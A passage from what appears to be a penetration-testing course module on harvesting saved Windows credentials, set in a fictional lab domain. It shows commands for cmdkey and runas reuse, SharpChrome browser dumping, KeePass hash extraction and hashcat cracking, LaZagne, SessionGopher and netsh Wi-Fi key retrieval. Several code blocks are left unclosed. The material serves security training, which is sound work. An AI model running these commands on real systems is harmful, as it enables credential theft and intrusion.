## Cmdkey Saved Credentials

#### Listing Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.
```cmd-session
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
	
```

When we attempt to RDP to the host, the saved credentials will be used.

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

#### Run Commands as Another User
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials

#### Retrieving Saved Credentials from Chrome

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.
```powershell-session
PS C:\htb> .\SharpChrome.exe logins /unprotect

## Password Managers

Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`. Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

#### Extracting KeePass Hash

First, we extract the hash in Hashcat format using the `keepass2john.py` script.

```shell-session
wallywhatever@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

#### Cracking Hash Offline

We can then feed the hash to Hashcat, specifying [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.
```shell-session
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

___

## More Fun with Credentials

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let's take it for a spin.

#### Viewing LaZagne Help Menu

We can view the help menu with the `-h` flag.
```powershell-session
PS C:\htb> .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
```

#### Running All LaZagne Modules

As we can see, there are many modules available to us. Running the tool with `all` will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.
```powershell-session
PS C:\htb> .\lazagne.exe all

## Even More Fun with Credentials

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.

#### Running SessionGopher as Current User

We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is always worth running as our current user to see if we can find any useful credentials.
```powershell-session
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

## Wifi Passwords

#### Viewing Saved Wireless Networks

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.
```cmd-session
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

#### Retrieving Saved Wireless Passwords

Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.
```cmd-session
C:\htb> netsh wlan show profile ilfreight_corp key=clear
